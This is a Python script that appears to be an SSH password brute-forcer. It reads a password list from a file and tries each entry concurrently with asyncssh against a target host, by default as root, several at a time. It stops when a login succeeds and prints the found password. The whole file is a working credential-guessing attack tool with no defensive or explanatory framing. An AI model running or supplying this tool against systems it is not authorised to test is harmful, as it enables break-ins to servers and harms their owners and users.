#!/usr/bin/env python3
# coding: utf-8
import asyncio, asyncssh, math, lib


class Asyncpwd:
    def __init__(self, pfile, host, username='root', port=22, known_hosts=None, asynclen=5):
        self.found = False
        self.host = host
        self.username = username
        self.password_list = lib.get_filedata(pfile)
        self.port = port
        self.known_hosts = known_hosts
        self.pwd_count = math.ceil(len(self.password_list) / asynclen)
        loop = asyncio.get_event_loop()
        while self.pwd_count:
            if self.found:
                break
            loop.run_until_complete(
                self.run_multiple_clients(self.password_list[:asynclen]))
            self.password_list = self.password_list[asynclen:]
            self.pwd_count = math.ceil(len(self.password_list) / asynclen)

    async def run_client(self, password):
        print('host: %s  -----  start test %s' % (self.host, password))
        async with asyncssh.connect(host=self.host,
                                    username=self.username,
                                    password=password,
                                    port=self.port,
                                    known_hosts=self.known_hosts) as conn:
            return await conn.run('echo "Found password: %s"' % password)

    async def run_multiple_clients(self, pwds):
        tasks = (self.run_client(password) for password in pwds)
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for i, result in enumerate(results, 1):
            if isinstance(result, Exception):
                print('Task %d failed: %s' % (i, result))
            elif result.exit_status != 0:
                print('Task %d exited with status %s:' % (i, result.exit_status))
                print(result.stderr, end='')
            else:
                print('Task %d succeeded: ' % i, end='')
                print(result.stdout, end='')
                self.found = True
